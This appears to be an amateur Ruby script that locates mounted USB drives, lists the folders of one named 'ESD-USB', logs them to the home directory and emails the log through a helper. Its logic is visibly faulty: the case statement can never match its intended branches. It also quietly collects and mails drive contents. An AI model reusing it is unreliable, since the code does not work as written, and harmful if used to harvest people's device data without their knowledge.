#!/usr/bin/env ruby

require "fileutils"
require 'net/smtp'
require_relative 'emailSender.rb'

def windows?
	(/cygwin|mswin|mingw|bccwin|wince|emx/ =~ RbConfig::CONFIG["host_os"]) != nil
end
def mac?
	(/darwin/ =~ RbConfig::CONFIG["host_os"]) != nil
end
def linux?
	not windows? and not mac?
end

src = "G:" if windows?
dest = Dir.home() if windows?

src = "/Volumes" if mac?
dest = Dir.home() if mac?

src = "/media" if linux?
dest = Dir.home() if linux?


pen = "ESD-USB"

localizePen = Dir.glob File.join(src,"*")
#subDirPen = Dir.glob File.join(src,pen,"**/")

logDevicesDir = File.join(dest,"Devices.txt")
logUSBDir = File.join(dest,"logUSB.txt")

def Directories(p)
	Dir.entries(p).select do |entry| File.directory? File.join(p,entry) and !(entry =="." || entry == "..") end
end

# f es una array de los archivos contenidos en el destino
def check_copy(src,dir1,dest)
		
	f = Dir.entries(dest).select {|entry| File.directory? File.join(dest,entry) and !(entry =="." || entry == "..") }	
		
	for folder in f
		if folder == dir1
			break
		else
			next
		end
	end
	FileUtils.copy_entry src,dest
end

def log_file (s,o,n)
	File.open(n,o) do |f|
		f.puts s
	end
end

def search(src,pen)#dest
	subDirPen = Dir.glob File.join(src,pen,"**/")
	log_file subDirPen, "w+","logUSB.txt"
	#for dir in Directories(src)
	#	if dir == "ESD-USB"
	#		src << "/" << dir
	#		for dir1 in Directories(src)
	#			if dir1 == "Copy"
	#				check_copy src,dir1,dest
	#			else
	#				log_file dir1, "w+", "logUSB.txt"
	#			end
	#		end
	#	else
	#		log_file dir, "w+","logUSB.txt"
	#	end
	#end
end

def keepSearching (src,pen,localizePen,logDevicesDir,logUSBDir)
	case pen
		when pen == "ESD-USB"
		    search src,pen
		    emailSender logUSBDir
		when pen != "ESD-USB"
			log_file localizePen,"w+",logDevicesDir
		else
			search src,pen
	end
end

keepSearching src,pen,localizePen,logDevicesDir,logUSBDir
#def timer (src,pen,localizePen,logDevicesDir,logUSBDir,logDevicesDir)
#	for time in range 1..10000
#		case time
#			when 8000
#				search src,pen
#			when 9000
#			    keepSearching src,pen,localizePen,logDevicesDir
#			when 10000
#				emailSender logDevicesDir emailSender logUSBDir
#			else
#				self
#			end
#		end
#	end
#end
	
#timer src,pen,localizePen,logDevicesDir,logUSBDir,logDevicesDir